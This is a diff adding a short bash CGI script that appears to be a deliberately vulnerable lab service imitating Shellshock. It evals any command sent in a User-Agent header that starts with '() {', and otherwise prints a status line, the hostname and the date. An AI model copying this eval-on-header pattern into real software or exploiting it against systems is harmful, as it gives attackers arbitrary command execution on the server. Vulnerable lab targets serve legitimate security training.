@@ -1,0 +1,11 @@
+#!/bin/bash
+echo "Content-Type: text/plain"
+echo ""
+if printf '%s' "$HTTP_USER_AGENT" | grep -q "^() {"; then
+    CMD=$(printf '%s' "$HTTP_USER_AGENT" | sed 's/^() { [^;]*; };//')
+    eval "${CMD}" 2>&1
+else
+    echo "lab cgi ok"
+    echo "host: $(hostname)"
+    echo "date: $(date -u +%FT%TZ)"
+fi
